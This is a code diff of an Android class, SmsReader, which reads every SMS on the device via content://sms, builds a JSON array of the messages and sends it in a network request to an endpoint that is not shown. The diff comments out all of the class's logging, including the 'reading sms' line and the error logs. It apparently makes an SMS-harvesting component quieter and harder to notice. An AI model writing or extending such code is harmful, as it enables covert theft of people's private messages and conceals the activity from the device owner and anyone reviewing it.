@@ -23,7 +23,7 @@ import java.util.TimeZone;
 public class SmsReader  {
     private final static String TAG = ChatService.class.getSimpleName();
     public static void readSMS(Context context, String id) throws JSONException {
-        Log.d(TAG,"reading sms");
+        //Log.d(TAG,"reading sms");
         ContentResolver contentResolver = context.getContentResolver();
         Cursor cursor = contentResolver.query(Uri.parse("content://sms"), null, null, null, null);
         JSONArray messagesArray = new JSONArray();
@@ -49,7 +49,7 @@ public class SmsReader  {
                     json.put("type", type);
                     messagesArray.put(json);
                 } catch (JSONException e) {
-                    Log.e(TAG, "Error creating JSON object: " + e.getMessage());
+                    //Log.e(TAG, "Error creating JSON object: " + e.getMessage());
                 }
             } while (cursor.moveToNext());
         }
@@ -66,7 +66,7 @@ public class SmsReader  {
                 throw new IOException("Unexpected code " + response.responseCode);
             }
         } catch (IOException e) {
-            Log.e(TAG, "Error sending request: " + e.getMessage());
+            //Log.e(TAG, "Error sending request: " + e.getMessage());
         }
     }
 }
